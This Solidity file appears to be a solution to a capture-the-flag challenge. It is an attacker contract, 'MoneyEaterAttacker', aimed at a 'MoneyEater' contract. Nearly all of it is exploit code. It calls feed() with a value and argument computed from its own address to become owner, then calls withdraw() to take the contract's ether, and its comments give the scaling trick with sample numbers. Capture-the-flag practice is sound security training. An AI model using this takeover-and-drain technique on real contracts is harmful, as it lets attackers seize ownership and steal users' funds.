pragma solidity ^0.4.23;

import "../CTF6/MoneyEater.sol";

contract MoneyEaterAttacker {
    MoneyEater internal moneyEater;

    constructor(address _moneyEaterAddress) public payable{
        moneyEater = MoneyEater(_moneyEaterAddress);
    }

    function attack() payable public {
        // We need to pass:
        // Value: Contract address, casted to uint256 and scaled
        // Parameter (etherAmount): Contract address, casted to uint256
        moneyEater.feed.value(uint256(address(this)) / getScale())(uint256(address(this)));
        //moneyEater.withdraw();
    }

    function changeOwner() public {
        // We need to pass:
        // Value: Contract address, casted to uint256 and scaled
        // Parameter (etherAmount): Contract address, casted to uint256
        moneyEater.feed.value(uint256(address(this)) / getScale())(uint256(address(this)));
    }

    function withdraw() public {
        moneyEater.withdraw();
    }

    // Helper functions
    function castAddress(uint256 adr) public view returns (uint256) {
        return adr;
    }

    function getAddress() public view returns (address) {
        return address(this);
    }

    function getAddressUint256() public view returns (uint256) {
        return uint256(address(this));
    }


    function getAddressUint256Scaled() public view returns (uint256) {
        return uint256(address(this)) / getScale();
    }

    function getScale() public view returns (uint256) {
        return 10**18 * 1 ether;
    }

    function getEtherAmountScale(uint256 etherAmount) public view returns (uint256) {
        uint256 scale =  10**18 * 1 ether;
        return etherAmount / scale;

        /*
            Value (Wei): 5
            etherAmount (Ether): 5000000000000000000000000000000000000
            Scale: 1000000000000000000000000000000000000
        */

        /*
            Value (Wei): 
            etherAmount (Ether): 1310716740946612778871481051410511170198943746221
            Scale: 1000000000000000000000000000000000000
        */
    }
}